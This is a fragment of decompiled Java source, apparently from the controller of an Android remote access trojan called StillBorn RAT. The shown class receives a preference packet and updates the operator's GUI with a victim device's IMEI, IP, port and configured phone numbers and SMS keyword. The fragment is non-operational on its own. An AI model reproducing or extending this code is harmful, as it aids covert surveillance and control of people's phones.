...
/*  4:   */ import Packet.PreferencePacket;
/*  5:   */ import gui.GUI;
/*  6:   */ import java.util.HashMap;
/*  7:   */ import server.Server;
/*  8:   */ 
/*  9:   */ public class PreferenceHandler
...
/* 15:   */   
/* 16:   */   public PreferenceHandler(int chan, String imei, GUI gui)
/* 17:   */   {
...
/* 26:   */   {
/* 27:46 */     this.gui.logTxt("Tercih bilgisi alındı");
/* 28:47 */     ((ChannelDistributionHandler)c.getChannelHandlerMap().get(this.imei)).removeListener(this.channel);
/* 29:48 */     PreferencePacket packet = (PreferencePacket)p;
/* 30:49 */     this.gui.updatePreference(this.imei, packet.getIp(), packet.getPort(), packet.isWaitTrigger(), packet.getPhoneNumberCall(), packet.getPhoneNumberSMS(), packet.getKeywordSMS());
/* 31:   */   }
/* 32:   */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     handler.PreferenceHandler
